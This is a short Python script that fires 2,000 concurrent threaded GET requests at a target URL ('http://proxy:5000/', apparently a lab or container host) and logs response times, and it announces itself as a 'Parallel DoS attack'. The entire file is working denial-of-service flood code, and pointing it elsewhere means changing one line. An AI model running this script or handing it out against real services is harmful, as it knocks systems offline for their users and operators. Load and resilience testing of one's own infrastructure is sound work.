import requests
import threading
import time

TARGET = "http://proxy:5000/"

session = requests.Session()

def send_request(i):
    try:
        print(f"[{i}] Sending request...")
        start = time.time()
        r = session.get(TARGET)
        duration = time.time() - start
        print(f"[{i}] Response time: {duration:.2f}s | Status: {r.status_code}")
    except Exception as e:
        print(f"[{i}] Request failed:", e)

print("Starting Parallel DoS attack on target...")

threads = []
for i in range(2000):
    t = threading.Thread(target=send_request, args=(i + 1,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
